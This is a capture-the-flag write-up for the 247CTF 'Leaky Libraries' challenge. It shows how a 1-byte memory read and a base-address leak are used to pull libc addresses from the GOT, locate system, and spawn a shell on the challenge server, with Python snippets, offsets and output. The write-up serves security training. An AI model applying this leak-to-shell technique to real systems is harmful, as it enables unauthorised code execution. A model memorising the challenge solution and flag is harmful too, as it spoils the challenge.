# Leaky Libraries - 247CTF PWN Challenge

## Description

> We don't want to share the entire binary, but we will provide a 1-byte memory leak. Can you abuse the leak to gain code execution on the server?

## Target

```
tcp://1d1233eee403d511.247ctf.com:50212
```

## Flag

```
247CTF{6301c179XXXXXXXXXXXXXXXX8fbcf3f1}
```

---

## Analysis

### Available Commands

The service offers 4 commands:

```
Commands:
    base - print base address
    read - read from an address
    call - call an address with /bin/sh as the argument
    exit - exit the program
```

### Observations

1. **base**: Returns the binary's base address (PIE enabled)
2. **read**: Allows reading 1 byte from any address
3. **call**: Calls an address passing `/bin/sh` as argument

The binary is 32-bit (addresses in range 0x565xxxxx).

---

## Strategy

### 1. Get binary base

```python
r.sendline(b'base')
# Response: Base address: 1448849408 (0x56595000)
```

### 2. Libc leak from GOT

The binary's GOT is at `base + 0x1fxx`. We read 4 bytes to obtain libc addresses:

| GOT Offset | Value | Low bits | Probable function |
|------------|-------|----------|------------------|
| 0x1fd8 | 0xf7dbdd90 | 0xd90 | __libc_start_main |
| 0x1fc0 | 0xf7e12f10 | 0xf10 | - |
| 0x1fc4 | 0xf7df5b60 | 0xb60 | - |

The pattern `0xd90` is typical of `__libc_start_main` in libc6-i386.

### 3. Identify libc

With `__libc_start_main` ending in `0xd90`, the libc is **libc6-i386_2.27**:

| Symbol | Offset |
|---------|--------|
| __libc_start_main | 0x18d90 |
| system | 0x3cd10 |

### 4. Calculate system and call it

```python
libc_base = libc_start_main - 0x18d90
system = libc_base + 0x3cd10

# call system("/bin/sh")
r.sendline(b'call')
r.sendline(str(system).encode())
```

---

## Execution

```
$ python3 solve.py
[*] Binary base: 0x56595000
[*] __libc_start_main @ libc: 0xf7dbdd90
[*] libc base: 0xf7da5000
[*] system: 0xf7de1d10
[+] Response: uid=1000(notroot) gid=1000(notroot) groups=1000(notroot)
    247CTF{...}
```

---

## Lessons Learned

1. **1-byte leak is enough**: Reading byte by byte, complete addresses can be reconstructed
2. **GOT as a source of leaks**: GOT entries contain resolved libc addresses
3. **Low bits patterns**: The last 12 bits of a function are constant and useful for identifying libc
4. **call with fixed argument**: If the service calls with `/bin/sh`, we only need to find `system`
